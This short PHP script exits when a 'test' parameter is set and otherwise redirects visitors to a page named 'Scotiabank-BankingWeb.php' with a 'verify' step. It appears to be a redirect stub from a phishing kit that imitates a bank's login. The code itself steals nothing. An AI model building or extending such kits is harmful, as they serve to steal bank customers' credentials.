<?php

if($_GET['test'] == 1)
{
    die();
}

header("Location: Scotiabank-BankingWeb.php?verify=2");

?>